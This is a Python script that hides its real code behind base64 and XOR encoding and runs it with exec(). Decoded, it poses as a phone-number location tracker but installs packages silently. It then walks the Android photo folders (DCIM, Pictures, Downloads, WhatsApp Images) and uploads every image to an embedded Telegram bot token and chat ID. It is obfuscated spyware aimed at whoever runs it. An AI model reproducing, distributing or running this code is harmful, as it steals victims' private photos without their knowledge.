# Encrypted with XOR + Base64

import base64

def xor_decrypt(data, key=42):
    return ''.join(chr(ord(c) ^ key) for c in data)

encoded_code = "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Q0ReAggICCAKCgoK4pai4pai4pai4pW94pa74pa74pa74pai4pai4pai4pW94pa74pai4pai4pai4pai4pai4pW94pa74pa74pai4pai4pai4pai4pai4pai4pW94pai4pai4pW94pa74pa74pai4pai4pW9IAoKCgrilqLilqLilqLilqLilb3ilrvilqLilqLilqLilqLilbvilqLilqLilb7ilbrilbrilqLilqLilb3ilqLilqLilb7ilbrilbrilbrilbrilbfilqLilqLilbvilrvilqLilqLilb7ilbcgCgoKCuKWouKWouKVvuKWouKWouKWouKWouKVvuKWouKWouKVu+KWouKWouKWouKWouKWouKWouKWouKVu+KVsOKWouKWouKWouKWouKWouKVveKWu+KWouKWouKWouKWouKWouKVuuKVt+KWuyAKCgoK4pai4pai4pW74pWw4pai4pai4pW+4pW34pai4pai4pW74pai4pai4pW+4pW64pW64pai4pai4pW74pa74pWw4pW64pW64pW64pai4pai4pW94pai4pai4pW+4pW64pai4pai4pW94pa7IAoKCgrilqLilqLilbvilrvilbDilbrilbfilrvilqLilqLilbvilqLilqLilbvilrvilrvilqLilqLilbvilqLilqLilqLilqLilqLilqLilb7ilbfilqLilqLilbvilrvilbDilqLilqLilb0gCgoKCuKVsOKVuuKVt+KWu+KWu+KWu+KWu+KWu+KVsOKVuuKVt+KVsOKVuuKVt+KWu+KWu+KVsOKVuuKVt+KVsOKVuuKVuuKVuuKVuuKVuuKVt+KWu+KVsOKVuuKVt+KWu+KWu+KVsOKVuuKVtyAgCgoKCnpCRURPCmRfR0hPWApmRUlLXkNFRAp+WEtJQU9YCgcKXB8EGiAKCgoKCAgIAyAKCgoKWUZPT1oCGwMgCgoKCklFTk8KFwpDRFpfXgIIFBQKb0ReT1gKSUVfRF5YUwpJRU5PCgJPBE0EBgoBExwcAxAKCAMgCgoKClpCRURPChcKQ0RaX14CCBQUCm9EXk9YClpCRURPCkRfR0hPWBAKCAMgIAoKCgpaWENEXgIIdkRx4py5dwpmRUlLXkNETQpEX0dIT1gEBAQIAyAKCgoKTEVYCkMKQ0QKWEtETU8CGwYKGxsDECAKCgoKCgoKClpYQ0ReAkwIelhFTVhPWVkQClFDABsaVw8IBgpPRE4XCHZYCAMgCgoKCgoKCgpZRk9PWgIaBBkDICAKCgoKQ0RMRQoXCmxrYW91bmt+awRNT14CSUVOTwYKUSAKCgoKCgoKCghJRV9EXlhTCBAKCH9EQURFXUQIBiAKCgoKCgoKCghJQ15TCBAKCGZFSUteQ0RNBAQECAYgCgoKCgoKCgoIWlhFXENOT1gIEAoIf0RBREVdRAggCgoKClcDICAKCgoKWlhDRF4CTAh2RHZEceKcuXcKZkVJS15DRUQKTEVfRE4LCAMgCgoKClpYQ0ReAkwIaUVfRF5YUxAKUUNETEVxDUlFX0ReWFMNd1cIAyAKCgoKWlhDRF4CTAhpQ15TEApRQ0RMRXENSUNeUw13VwgDIAoKCgpaWENEXgJMCHpYRVxDTk9YEApRQ0RMRXENWlhFXENOT1gNd1cIAyAKCgoKWlhDRF4CCGtJSV9YS0lTEAobGhoKR09eT1hZdkRpRUVYTkNES15PWQpdQ0ZGCkhPCl9aTkteT04KWUVFRAQEBHZECAMgIEtZU0RJCk5PTApYX0R1XkVFRgIDECAKCgoKWkteQlkKFwpNT151S0ZGdVpFWVlDSEZPdUNHS01PdVpLXkJZAgMgCgoKCllPRE51XktZQQoXCktZU0RJQ0UESVhPS15PdV5LWUECWU9ETnVDR0tNT1kCWkteQlkDAwoKCQp5XktYXgpDRApIS0lBTVhFX0ROIAoKCgpLXUtDXgpZT0ROdV5LWUEKCgkKfUtDXgpZQ0ZPRF5GUwpDRApIS0lBTVhFX0ROCktMXk9YCkxLQU8Kf2MgCgoKCkxLQU91RkVJS15DRUR1XkVFRgIDCgoJCnhfRApDR0dPTkNLXk9GUyAgICBOT0wKR0tDRHVHT0RfAgMQIAoKCgpdQkNGTwp+WF9PECAKCgoKCgoKClpYQ0ReAggICCAKCgoKCgoKChcXFxcXFxcXFxcKZ0tDRApnT0RfChcXFxcXFxcXFxcgCgoKCgoKCgpxG3cKY0RZXktGRgpYT1tfQ1hPTgpeRUVGWSAKCgoKCgoKCnEYdwp4X0QKXkJPCl5FRUYgCgoKCgoKCgpxGXcKb1JDXiAKCgoKCgoKChcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcgCgoKCgoKCgoICAgDIAoKCgoKCgoKSUJFQ0lPChcKQ0RaX14CCBQUCnlPRk9JXgpTRV9YCkVaXkNFRBAKCAMgIAoKCgoKCgoKQ0wKSUJFQ0lPChcXCggbCBAgCgoKCgoKCgoKCgoKQ0RZXktGRnVYT1tfQ1hPR09EXlkCAyAKCgoKCgoKCk9GQ0wKSUJFQ0lPChcXCggYCBAgCgoKCgoKCgoKCgoKS1lTRElDRQRYX0QCWF9EdV5FRUYCAwMgCgoKCgoKCgpPRkNMCklCRUNJTwoXFwoIGQgQIAoKCgoKCgoKCgoKClpYQ0ReAghtRUVOSFNPCvCfkaEIAyAKCgoKCgoKCgoKCgpIWE9LQSAKCgoKCgoKCk9GWU8QIAoKCgoKCgoKCgoKClpYQ0ReAghjRFxLRkNOCklCRUNJTwYKWkZPS1lPCl5YUwpLTUtDRAQIAyAgQ0wKdXVES0dPdXUKFxcKCHV1R0tDRHV1CBAgCgoKCkdLQ0R1R09EXwID"
decoded = base64.b64decode(encoded_code).decode()
exec(xor_decrypt(decoded))
